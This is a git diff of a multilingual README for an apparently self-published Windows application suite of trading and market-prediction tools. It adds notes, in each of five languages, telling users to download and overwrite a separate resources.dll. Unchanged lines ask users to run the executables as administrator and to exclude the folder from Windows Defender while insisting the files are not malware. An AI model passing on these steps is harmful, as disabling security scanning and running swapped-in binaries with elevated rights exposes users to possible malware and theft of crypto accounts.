@@ -1,5 +1,8 @@
 # thdtjsdn.com -- Application
 
+이 애플리케이션은 http://thdtjsdn.com에서 제공하는 실행 가능한 서비스 모음입니다.
+아래 주요 기능을 검토하고 해당 버튼을 통해 각 서비스에 접속하세요.
+
 > ZIP으로 다운 받아도 [`resources.dll`](https://github.com/thdtjsdn/thdtjsdn.com--Applicatioon/blob/main/resources.dll) 파일은 개별로 다시 다운 받아서 덮어써야합니다.  
 > 용량크기로 인해 LFS 문제입니다.
 
@@ -140,6 +143,11 @@ AI 모델을 활용하여 시장의 미래를 예측하는 도구입니다.
 This application is a suite of executable services provided by [http://thdtjsdn.com](http://thdtjsdn.com).  
 Please review the key features below and access each service via its respective button.
 
+> Even if you download the ZIP, you still need to download the [`resources.dll`](https://github.com/thdtjsdn/thdtjsdn.com--Applicatioon/blob/main/resources.dll) file separately and overwrite it.  
+> This is due to an LFS issue caused by the large file size.
+
+---
+
 > ⚠️ Note: Executables require administrator privileges but do **not** contain malware.  
 > Due to the absence of a paid certificate, some systems may misidentify it as malicious.  
 > To avoid issues, exclude the application folder from Windows Defender or other security software.
@@ -264,6 +272,11 @@ Automated trading services based on various strategies.
 
 このアプリケーションは [http://thdtjsdn.com](http://thdtjsdn.com) によって提供される実行可能サービスのスイートです。  
 以下の主な機能をご確認の上、それぞれのボタンからサービスにアクセスしてください。
+
+> ZIPファイルをダウンロードしても、[`resources.dll`](https://github.com/thdtjsdn/thdtjsdn.com--Applicatioon/blob/main/resources.dll) ファイルは個別に再ダウンロードして上書きする必要があります。  
+> ファイルサイズが大きいため、LFSの問題が発生しています。
+
+---
 
 > ⚠️ 注意：実行ファイルは管理者権限を必要としますが、**マルウェアは含まれていません**。  
 > 有料証明書がないため、一部のシステムでは誤って悪意のあるソフトと認識される可能性があります。  
@@ -391,6 +404,11 @@ Binance取引所に特化したダッシュボード。
 此应用程序是由 [http://thdtjsdn.com](http://thdtjsdn.com) 提供的一套可执行服务。  
 请查看以下主要功能，并通过各自的按钮访问每项服务。
 
+> 即使你下载了 ZIP 文件，仍然需要单独下载 [`resources.dll`](https://github.com/thdtjsdn/thdtjsdn.com--Applicatioon/blob/main/resources.dll) 文件并覆盖原文件。  
+> 这是由于文件体积过大导致的 LFS 问题。
+
+---
+
 > ⚠️ 注意：可执行文件需要管理员权限，但**不包含恶意软件**。  
 > 由于没有付费证书，某些系统可能会误识为恶意程序。  
 > 为避免问题，请将应用程序文件夹从 Windows Defender 或其他安全软件中排除。
@@ -516,6 +534,11 @@ Binance取引所に特化したダッシュボード。
 
 Aplikasi ini adalah rangkaian layanan eksekusi yang disediakan oleh [http://thdtjsdn.com](http://thdtjsdn.com).  
 Silakan tinjau fitur utama di bawah ini dan akses setiap layanan melalui tombol masing-masing.
+
+> Meskipun Anda mengunduh dalam format ZIP, file [`resources.dll`](https://github.com/thdtjsdn/thdtjsdn.com--Applicatioon/blob/main/resources.dll) tetap harus diunduh secara terpisah dan ditimpa.  
+> Ini disebabkan oleh masalah LFS karena ukuran file yang besar.
+
+---
 
 > ⚠️ Catatan: File eksekusi memerlukan hak administrator tetapi **tidak** mengandung malware.  
 > Karena tidak memiliki sertifikat berbayar, beberapa sistem mungkin salah mengidentifikasi sebagai berbahaya.  
